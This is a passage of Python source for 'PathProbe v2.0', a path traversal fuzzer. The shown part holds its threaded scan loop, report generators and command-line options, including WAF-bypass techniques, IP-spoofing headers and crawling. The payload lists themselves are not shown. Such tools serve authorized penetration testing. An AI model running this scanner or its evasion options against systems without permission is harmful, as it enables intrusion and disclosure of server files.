        verify_ssl=not args.no_ssl_verify, verbose=args.verbose,
    )

    # Summary
    hi = sum(1 for t in targets for p in t.get("priorities", {}).values() if p == "HIGH")
    md = sum(1 for t in targets for p in t.get("priorities", {}).values() if p == "MEDIUM")
    lo = sum(1 for t in targets for p in t.get("priorities", {}).values() if p == "LOW")
    print(f"\n{BOLD}[*] Parameter priority summary:{RST}")
    print(f"    {R}HIGH:{RST}   {hi}")
    print(f"    {Y}MEDIUM:{RST} {md}")
    print(f"    {DIM}LOW:{RST}    {lo}")

    return targets


# ─────────────────────────────────────────────
#  SCANNER
# ─────────────────────────────────────────────
def run_scan(args):
    findings       = []
    total_requests = 0
    start_time     = time.time()
    _lock          = threading.Lock()          # guards findings + counter
    n_threads      = min(max(1, getattr(args, "threads", 5)), 50)
    _rate_lim      = _RateLimiter(args.rate) if getattr(args, "rate", None) else None

    # Payloads — built-in categories (full vs reduced for MEDIUM priority)
    selected_cats = list(PAYLOADS.keys()) if args.payloads == "all" else \
                    [c.strip() for c in args.payloads.split(",") if c.strip() in PAYLOADS]
    all_payloads = [(cat, p) for cat in selected_cats for p in PAYLOADS[cat]]
    # Reduced set for MEDIUM-priority params (classic + filter_bypass only)
    _MEDIUM_CATS = {"classic", "filter_bypass", "null_byte"}
    med_payloads = [(cat, p) for cat, p in all_payloads if cat in _MEDIUM_CATS]

    # Wordlist payloads — raw, WAF transforms intentionally skipped
    wordlist_payloads = []
    if getattr(args, "wordlist", None):
        wordlist_payloads = [("wordlist", p) for p in load_wordlist(args.wordlist)]

    # WAF
    waf_techniques = []
    if args.waf_bypass:
        raw = [t.strip() for t in args.waf_bypass.split(",")]
        waf_techniques = ["all"] if "all" in raw else raw

    # POST modes
    post_modes = []
    if args.post_mode:
        pm_raw = [m.strip() for m in args.post_mode.split(",")]
        post_modes = list(POST_MODES.keys()) if "all" in pm_raw else \
                     [m for m in pm_raw if m in POST_MODES]

    # ── Parameter assembly (manual + crawled) ──
    manual_params = [p.strip() for p in args.param.split(",")]
    recon_targets = run_recon(args) if getattr(args, "crawl", None) else []

    # Build scan target list: [(url, [params], priority_map)]
    scan_targets = []
    if recon_targets:
        for rt in recon_targets:
            scan_targets.append((rt["url"], list(rt["priorities"].keys()), rt.get("priorities", {})))
        # Also add the user-specified URL+params as HIGH priority
        if manual_params != ["file"] or not recon_targets:
            scan_targets.insert(0, (args.url, manual_params,
                                    {p: "HIGH" for p in manual_params}))
    else:
        scan_targets = [(args.url, manual_params,
                         {p: "HIGH" for p in manual_params})]

    params = manual_params  # backwards-compat for config print

    extra_headers = {}
    if args.headers:
        for h in args.headers.split(";"):
            if ":" in h:
                k, v = h.split(":", 1)
                extra_headers[k.strip()] = v.strip()
    if args.waf_ip_spoof:
        extra_headers = waf_reverse_proxy_headers(extra_headers)

    # Print config
    print(f"\n{BOLD}{W}[*] Target      :{RST} {args.url}")
    print(f"{BOLD}{W}[*] Params      :{RST} {', '.join(params)}")
    print(f"{BOLD}{W}[*] Payloads    :{RST} {len(all_payloads)} across {len(selected_cats)} categories")
    if wordlist_payloads:
        print(f"{BOLD}{W}[*] Wordlist     :{RST} {len(wordlist_payloads)} payloads {DIM}(raw, no WAF transforms){RST}")
    print(f"{BOLD}{W}[*] Method      :{RST} {args.method}")
    print(f"{BOLD}{W}[*] Threads     :{RST} {n_threads}")
    _rate_str = f"{args.rate:.1f} req/s" if getattr(args, 'rate', None) else "unlimited"
    print(f"{BOLD}{W}[*] Rate        :{RST} {_rate_str}")
    print(f"{BOLD}{W}[*] Retries     :{RST} {getattr(args, 'retries', 0)}")
    print(f"{BOLD}{W}[*] POST modes  :{RST} {', '.join(post_modes) if post_modes else 'disabled'}")
    print(f"{BOLD}{W}[*] WAF bypass  :{RST} {args.waf_bypass or 'disabled'}")
    print(f"{BOLD}{W}[*] IP spoofing :{RST} {'enabled' if args.waf_ip_spoof else 'disabled'}")
    print(f"\n{'─'*60}")

    # Baseline
    print(f"\n{C}[~] Getting baseline response...{RST}")
    baseline = make_request(args.url, method="GET", headers=extra_headers,
                            cookies=args.cookies, timeout=args.timeout,
                            verify_ssl=not args.no_ssl_verify)
    baseline_length = baseline["length"] if baseline else 0
    baseline_body   = baseline["body"]   if baseline else ""
    if baseline:
        print(f"{DIM}    Status: {baseline['status']}  |  Length: {baseline_length}  |  Time: {baseline['elapsed']}s{RST}")
    else:
        print(f"{Y}[!] Baseline failed — proceeding{RST}")

    print(f"\n{C}[~] Starting scan...{RST}\n")

    def _test(param, category, payload, resp, waf_tech=None, post_mode=None):
        nonlocal total_requests
        total_requests += 1
        if resp is None:
            if args.verbose:
                wt = f"[{waf_tech}]" if waf_tech else ""
                print(f"  {DIM}[{total_requests:04d}] TIMEOUT  {wt}  param={param}  {payload[:50]}{RST}")
            return

        result = analyze_response(
            resp, baseline_length, baseline_body=baseline_body,
            verbose=args.verbose
        )
        if result["vulnerable"]:
            sev = result["matches"][0]["severity"] if result["matches"] else "LOW"
            sc = R if sev == "CRITICAL" else Y if sev == "HIGH" else M
            pm_tag   = f"{C}[{post_mode}]{RST} " if post_mode else ""
            waf_tag  = f"{M}[WAF:{waf_tech}]{RST} " if waf_tech else ""
            err_tag  = f"{Y}[ERR]{RST} " if result["error_detected"] else ""
            sim_tag  = f"{DIM}[sim:{result['similarity_score']:.2f}]{RST} " if baseline_body else ""
            print(f"  {R}[VULN]{RST} {sc}{sev:<8}{RST}  {pm_tag}{waf_tag}{err_tag}{sim_tag}param={BOLD}{param}{RST}  {G}{payload[:52]}{RST}")
            for m in result["matches"]:
                print(f"         {DIM}↳ {m['description']} (OS: {m['os']}){RST}")
            if result["error_detected"] and result["error_signatures_hit"]:
                print(f"         {Y}↳ Error-based: {', '.join(result['error_signatures_hit'])}{RST}")
            findings.append({
                "param":              param,
                "category":          category,
                "payload":           payload,
                "url":               resp["url"],
                "status":            resp["status"],
                "response_length":   resp["length"],
                "elapsed":           resp["elapsed"],
                "confidence":        result["confidence"],
                "signatures":        result["matches"],
                "size_anomaly":      result["size_anomaly"],
                "similarity_score":  result["similarity_score"],
                "error_detected":    result["error_detected"],
                "error_signatures_hit": result["error_signatures_hit"],
                "evidence_snippet":  resp["body"][:500],
                "post_mode":         post_mode or "GET",
                "waf_technique":     waf_tech or "none",
                "timestamp":         datetime.now().isoformat(),
            })
        elif args.verbose:
            wt = f"[{waf_tech}] " if waf_tech else ""
            print(f"  {DIM}[{total_requests:04d}] {resp['status']}  {wt}param={param}  {payload[:50]}{RST}")

    def _send_post(param, category, payload, pm, waf_tech=None):
        builder = POST_MODES.get(pm)
        if not builder:
            return
        try:
            if pm == "multipart":
                body, ph = builder(param, payload, filename_inject=args.filename_inject)
            elif pm == "json":
                body, ph = builder(param, payload, json_template=args.json_template)
            else:
                body, ph = builder(param, payload)
        except Exception:
            return
        h = dict(extra_headers)
        h.update(ph)
        resp = make_request(args.url, method="POST", headers=h, cookies=args.cookies,
                            post_body=body, timeout=args.timeout,
                            verify_ssl=not args.no_ssl_verify,
                            retries=getattr(args, "retries", 0),
                            _rate_lim=_rate_lim, _verbose=args.verbose)
        with _lock:
            _test(param, category, payload, resp, waf_tech=waf_tech, post_mode=pm)

    # ── Build flat task list ──────────────────────────────────────────
    # Each task: (target_url, method, param, category, payload, waf_tech, post_mode)
    all_tasks = []

    def _build_tasks_for(target_url, param, priority):
        """Append tasks for one (url, param) pair respecting priority level."""
        # Choose payload set based on priority
        if priority == "LOW":
            return          # skip entirely unless no recon was run
        elif priority == "MEDIUM":
            pay_list = med_payloads
        else:               # HIGH or manual (always HIGH)
            pay_list = all_payloads

        for category, payload in pay_list:
            if args.method in ("GET", "BOTH"):
                all_tasks.append((target_url, "GET", param, category, payload, None, None))
            for pm in post_modes:
                all_tasks.append((target_url, "POST", param, category, payload, None, pm))
            if waf_techniques:
                for tech, mutated in apply_waf_bypass(payload, waf_techniques):
                    if args.method in ("GET", "BOTH"):
                        all_tasks.append((target_url, "GET", param, category, mutated, tech, None))
                    for pm in post_modes:
                        all_tasks.append((target_url, "POST", param, category, mutated, tech, pm))
        # Wordlist payloads always included for HIGH; skip for MEDIUM if list is large
        for category, payload in wordlist_payloads:
            if args.method in ("GET", "BOTH"):
                all_tasks.append((target_url, "GET", param, category, payload, None, None))
            for pm in post_modes:
                all_tasks.append((target_url, "POST", param, category, payload, None, pm))

    for target_url, target_params, priority_map in scan_targets:
        for param in target_params:
            prio = priority_map.get(param, "HIGH")
            _build_tasks_for(target_url, param, prio)

    # ── Task executor ─────────────────────────────────────────────────
    def _execute_task(target_url, method, param, category, payload, waf_tech, post_mode):
        """One unit of work: one HTTP request + detection pass."""
        if args.delay > 0:
            time.sleep(args.delay)
        if method == "GET":
            resp = make_request(
                target_url, method="GET", headers=extra_headers,
                cookies=args.cookies, param=param, payload=payload,
                timeout=args.timeout, verify_ssl=not args.no_ssl_verify,
                retries=getattr(args, "retries", 0),
                _rate_lim=_rate_lim, _verbose=args.verbose,
            )
            with _lock:
                _test(param, category, payload, resp, waf_tech=waf_tech)
        else:
            # POST: rebuild _send_post inline to support per-target URL
            builder = POST_MODES.get(post_mode)
            if not builder:
                return
            try:
                if post_mode == "multipart":
                    body, ph = builder(param, payload, filename_inject=args.filename_inject)
                elif post_mode == "json":
                    body, ph = builder(param, payload, json_template=args.json_template)
                else:
                    body, ph = builder(param, payload)
            except Exception:
                return
            h = dict(extra_headers)
            h.update(ph)
            resp = make_request(target_url, method="POST", headers=h, cookies=args.cookies,
                                post_body=body, timeout=args.timeout,
                                verify_ssl=not args.no_ssl_verify,
                                retries=getattr(args, "retries", 0),
                                _rate_lim=_rate_lim, _verbose=args.verbose)
            with _lock:
                _test(param, category, payload, resp, waf_tech=waf_tech, post_mode=post_mode)

    with ThreadPoolExecutor(max_workers=n_threads) as executor:
        futures = []
        try:
            for task in all_tasks:
                futures.append(executor.submit(_execute_task, *task))
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception:
                    pass
        except KeyboardInterrupt:
            for fut in futures:
                fut.cancel()
            raise

    elapsed_total = round(time.time() - start_time, 2)
    print(f"\n{'─'*60}")
    print(f"\n{BOLD}[+] Scan complete{RST}  —  {total_requests} requests  |  {G}{len(findings)} finding(s){RST}  |  {elapsed_total}s\n")
    return findings

# ─────────────────────────────────────────────
#  REPORTS
# ─────────────────────────────────────────────
def generate_report(findings, args):
    if not findings:
        print(f"{Y}[!] No vulnerabilities found.{RST}")
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = f"pathprobe_report_{ts}"

    if "json" in args.report or "all" in args.report:
        fname = f"{base}.json"
        with open(fname, "w") as f:
            json.dump({"tool": "PathProbe", "version": "2.0", "target": args.url,
                       "scan_time": datetime.now().isoformat(),
                       "total_findings": len(findings),
                       "summary": _build_summary(findings),
                       "findings": findings}, f, indent=2)
        print(f"{G}[+] JSON  → {fname}{RST}")

    if "csv" in args.report or "all" in args.report:
        fname = f"{base}.csv"
        fields = ["param","category","payload","url","status","response_length",
                  "elapsed","confidence","size_anomaly","post_mode","waf_technique",
                  "timestamp","signatures_summary"]
        with open(fname, "w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=fields)
            w.writeheader()
            for fnd in findings:
                row = {k: fnd.get(k, "") for k in fields if k != "signatures_summary"}
                row["signatures_summary"] = "; ".join(
                    f"{s['description']} [{s['severity']}]" for s in fnd.get("signatures", []))
                w.writerow(row)
        print(f"{G}[+] CSV   → {fname}{RST}")

    if "html" in args.report or "all" in args.report:
        fname = f"{base}.html"
        with open(fname, "w") as f:
            f.write(_build_html_report(findings, args))
        print(f"{G}[+] HTML  → {fname}{RST}")

    if "txt" in args.report or "all" in args.report:
        fname = f"{base}.txt"
        with open(fname, "w") as f:
            f.write(_build_txt_report(findings, args))
        print(f"{G}[+] TXT   → {fname}{RST}")


def _build_summary(findings):
    sev = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for f in findings:
        for s in f.get("signatures", []):
            sev[s["severity"]] = sev.get(s["severity"], 0) + 1
        if not f.get("signatures") and f.get("size_anomaly"):
            sev["LOW"] += 1
    return {"severity_counts": sev,
            "affected_params":   list({f["param"] for f in findings}),
            "payload_categories": list({f["category"] for f in findings}),
            "post_modes_hit":    list({f["post_mode"] for f in findings}),
            "waf_techniques_hit": list({f["waf_technique"] for f in findings if f["waf_technique"] != "none"})}


def _build_txt_report(findings, args):
    lines = ["="*70, "  PathProbe v2.0 - Path Traversal Vulnerability Report",
             "="*70,
             f"  Target    : {args.url}",
             f"  Generated : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"  Findings  : {len(findings)}", "="*70, ""]
    s = _build_summary(findings)
    lines += ["SUMMARY", "-"*40]
    for sv, cnt in s["severity_counts"].items():
        if cnt:
            lines.append(f"  {sv:<12}: {cnt}")
    lines += [f"  Params hit    : {', '.join(s['affected_params'])}",
              f"  POST modes hit: {', '.join(s['post_modes_hit'])}",
              f"  WAF bypasses  : {', '.join(s['waf_techniques_hit']) or 'none'}", ""]
    for i, f in enumerate(findings, 1):
        lines += [f"FINDING #{i}", "-"*40,
                  f"  Parameter   : {f['param']}",
                  f"  Payload     : {f['payload']}",
                  f"  Category    : {f['category']}",
                  f"  POST Mode   : {f.get('post_mode','GET')}",
                  f"  WAF Bypass  : {f.get('waf_technique','none')}",
                  f"  URL         : {f['url']}",
                  f"  Status      : {f['status']}",
                  f"  Confidence  : {f['confidence']}",
                  f"  Timestamp   : {f['timestamp']}"]
        if f.get("signatures"):
            lines.append("  Signatures  :")
            for s in f["signatures"]:
                lines.append(f"    * [{s['severity']}] {s['description']} (OS: {s['os']})")
        lines += [f"  Evidence    :\n{f.get('evidence_snippet','')[:300]}", ""]
    lines += ["="*70, "  PathProbe v2.0 | For authorized testing only", "="*70]
    return "\n".join(lines)


def _build_html_report(findings, args):
    summary  = _build_summary(findings)
    sev_col  = {"CRITICAL": "#ff4444", "HIGH": "#ff8800", "MEDIUM": "#ffcc00", "LOW": "#44aaff"}
    waf_hits = ", ".join(summary["waf_techniques_hit"]) or "—"
    pm_hits  = ", ".join(summary["post_modes_hit"]) or "—"

    findings_html = ""
    for i, f in enumerate(findings, 1):
        sigs_html = "".join(
            f'<span class="badge badge-{s["severity"].lower()}">{s["severity"]}</span> '
            f'{s["description"]} (OS: {s["os"]})<br>'
            for s in f.get("signatures", [])
        ) or "<em>Size anomaly detected</em>"
        pm = f.get("post_mode","GET")
        wt = f.get("waf_technique","none")
        waf_tag = f'<span class="tag tag-waf">WAF:{wt}</span>' if wt != "none" else ""
        findings_html += f"""
        <div class="finding">
          <div class="finding-header">
            <span class="finding-num">#{i}</span>
            <span class="finding-conf conf-{f['confidence'].lower()}">{f['confidence']}</span>
            <span class="tag tag-post">{pm}</span>{waf_tag}
            <code class="payload">{f['payload'][:80]}</code>
          </div>
          <table class="details">
            <tr><td>Parameter</td><td><code>{f['param']}</code></td></tr>
            <tr><td>Category</td><td>{f['category']}</td></tr>
            <tr><td>POST Mode</td><td>{pm}</td></tr>
            <tr><td>WAF Bypass</td><td>{wt}</td></tr>
            <tr><td>Status</td><td>{f['status']}</td></tr>
            <tr><td>Response Len</td><td>{f['response_length']} bytes</td></tr>
            <tr><td>Time</td><td>{f['elapsed']}s</td></tr>
            <tr><td>Timestamp</td><td>{f['timestamp']}</td></tr>
            <tr><td>Signatures</td><td>{sigs_html}</td></tr>
          </table>
          <details><summary>Evidence Snippet</summary>
            <pre class="evidence">{f.get('evidence_snippet','')[:500]}</pre>
          </details>
        </div>"""

    sev_boxes = "".join(
        f'<div class="sev-box" style="border-color:{sev_col.get(s,"#888")}">'
        f'<div class="sev-count" style="color:{sev_col.get(s,"#888")}">{c}</div>'
        f'<div class="sev-label">{s}</div></div>'
        for s, c in summary["severity_counts"].items()
    )
    return f"""<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>PathProbe v2.0 Report</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;padding:2rem}}
h1{{color:#58a6ff;font-size:2rem;margin-bottom:.25rem}}
.meta{{color:#8b949e;margin-bottom:1rem;font-size:.85rem}}
.scan-meta{{display:flex;gap:1rem;margin-bottom:2rem;font-size:.8rem;color:#8b949e;flex-wrap:wrap}}
.scan-meta span{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.4rem .8rem}}
.summary{{display:flex;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}}
.sev-box{{border:2px solid;border-radius:8px;padding:1rem 1.5rem;text-align:center;min-width:100px}}
.sev-count{{font-size:2rem;font-weight:bold}}
.sev-label{{font-size:.75rem;color:#8b949e;margin-top:.25rem}}
.finding{{background:#161b22;border:1px solid #30363d;border-radius:8px;margin-bottom:1rem;overflow:hidden}}
.finding-header{{background:#21262d;padding:.75rem 1rem;display:flex;align-items:center;gap:.5rem;flex-wrap:wrap}}
.finding-num{{color:#8b949e;font-size:.8rem}}
.payload{{background:#0d1117;padding:.2rem .5rem;border-radius:4px;color:#79c0ff;font-size:.82rem}}
.conf-high,.badge-critical{{background:#ff4444;color:#fff;padding:.15rem .5rem;border-radius:4px;font-size:.72rem;font-weight:bold}}
.conf-medium,.badge-high{{background:#ff8800;color:#fff;padding:.15rem .5rem;border-radius:4px;font-size:.72rem;font-weight:bold}}
.conf-low,.badge-medium{{background:#ffcc00;color:#000;padding:.15rem .5rem;border-radius:4px;font-size:.72rem;font-weight:bold}}
.badge-low{{background:#44aaff;color:#fff;padding:.15rem .5rem;border-radius:4px;font-size:.72rem;font-weight:bold}}
.tag{{padding:.15rem .5rem;border-radius:4px;font-size:.72rem;font-weight:bold}}
.tag-post{{background:#1f6feb;color:#fff}}
.tag-waf{{background:#8957e5;color:#fff}}
.details{{width:100%;padding:1rem;border-collapse:collapse;font-size:.85rem}}
.details td{{padding:.3rem 1rem;vertical-align:top}}
.details td:first-child{{color:#8b949e;width:140px}}
details{{padding:.5rem 1rem 1rem}}
summary{{cursor:pointer;color:#58a6ff;margin-bottom:.5rem}}
.evidence{{background:#0d1117;padding:1rem;border-radius:4px;font-size:.75rem;white-space:pre-wrap;color:#e3b341;overflow-x:auto}}
footer{{margin-top:3rem;color:#8b949e;font-size:.75rem;text-align:center}}
</style></head><body>
<h1>🔍 PathProbe v2.0 Report</h1>
<div class="meta">Target: {args.url} &nbsp;|&nbsp; Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp; {len(findings)} findings</div>
<div class="scan-meta">
  <span>📡 POST modes: {pm_hits}</span>
  <span>🛡️ WAF bypasses: {waf_hits}</span>
  <span>🎯 Params: {", ".join(summary["affected_params"])}</span>
</div>
<div class="summary">{sev_boxes}</div>
<h2 style="color:#8b949e;margin-bottom:1rem;font-size:.9rem;text-transform:uppercase;letter-spacing:2px">Findings</h2>
{findings_html}
<footer>PathProbe v2.0 | For authorized security testing only</footer>
</body></html>"""

# ─────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────
def build_parser():
    p = argparse.ArgumentParser(
        prog="pathprobe",
        description="PathProbe v2.0 — Path Traversal + WAF Bypass + POST Fuzzer (authorized use only)",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("url", help="Target URL")
    p.add_argument("-p", "--param", default="file",
                   help="Parameter(s) to test, comma-separated (default: file)")
    p.add_argument("-m", "--method", default="GET", choices=["GET","POST","BOTH"],
                   help="HTTP method: GET | POST | BOTH (default: GET)")
    p.add_argument("--payloads", default="all",
                   help="Payload categories (comma-sep or 'all'):\n"
                        "  classic, url_encoded, double_encoded, unicode,\n"
                        "  filter_bypass, null_byte, web_configs,\n"
                        "  path_normalization, truncation, archive_traversal")
    # POST fuzzing
    p.add_argument("--post-mode", dest="post_mode", default=None,
                   help="POST body format(s) (comma-sep or 'all'):\n"
                        "  form, json, json_array, xml, multipart, graphql")
    p.add_argument("--json-template", dest="json_template", default=None,
                   help='Base JSON template for json mode (e.g. \'{"action":"view"}\')')
    p.add_argument("--filename-inject", dest="filename_inject", action="store_true",
                   help="Inject into multipart filename field (file upload testing)")
    # WAF bypass
    p.add_argument("--waf-bypass", dest="waf_bypass", default=None,
                   help="WAF bypass technique(s) (comma-sep or 'all'):\n"
                        "  case_variation, overlong_utf8, tab_newline,\n"
                        "  double_slash, insert_null, path_comment,\n"
                        "  unicode_normalization")
    p.add_argument("--waf-ip-spoof", dest="waf_ip_spoof", action="store_true",
                   help="Add IP spoofing headers (X-Forwarded-For, X-Real-IP, etc.)")
    # Wordlist
    # Recon / crawl
    p.add_argument("--crawl", type=int, default=None, metavar="DEPTH",
                   help="Crawl target up to DEPTH levels deep and auto-discover parameters\n"
                        "  (e.g. --crawl 2)")
    p.add_argument("--max-urls", dest="max_urls", type=int, default=1000, metavar="N",
                   help="Maximum URLs to crawl (default: 1000)")
    # Wordlist
    p.add_argument("--wordlist", dest="wordlist", default=None, metavar="FILE",
                   help="External payload wordlist (one payload per line).\n"
                        "  Payloads are used as-is — no encoding or WAF transforms.\n"
                        "  Blank lines and lines starting with '#' are skipped.")
    # Performance
    p.add_argument("--threads", dest="threads", type=int, default=5, metavar="N",
                   help="Concurrent threads (default: 5, max: 50)")
    p.add_argument("--rate", dest="rate", type=float, default=None, metavar="RPS",
                   help="Max requests per second across all threads (e.g. 10.0)")
    p.add_argument("--retries", dest="retries", type=int, default=2, metavar="N",
                   help="Retry count on network/timeout errors (default: 2)")
    # Request
    p.add_argument("-H", "--headers", help='Extra headers (semicolon-sep)')
    p.add_argument("-c", "--cookies", help="Cookies string")
    p.add_argument("--timeout", type=int, default=10, help="Timeout seconds (default: 10)")
    p.add_argument("--delay", type=float, default=0.0, help="Delay between requests (default: 0)")
    p.add_argument("--no-ssl-verify", action="store_true", help="Disable SSL verification")
    # Output
    p.add_argument("--report", default="txt",
                   help="Report format(s): txt,json,csv,html,all (default: txt)")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    return p


def main():
    print(BANNER)
    parser = build_parser()
    args = parser.parse_args()

    print(f"\n{R}{BOLD}[!] LEGAL NOTICE{RST}: Authorized penetration testing ONLY.")
    print(f"{R}    Unauthorized use is illegal. Ensure written permission.{RST}\n")

    try:
        findings = run_scan(args)
        if findings:
            print(f"{BOLD}[*] Generating reports ({args.report})...{RST}")
            generate_report(findings, args)
        print()
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Interrupted.{RST}\n")
        sys.exit(1)


if __name__ == "__main__":
    main()
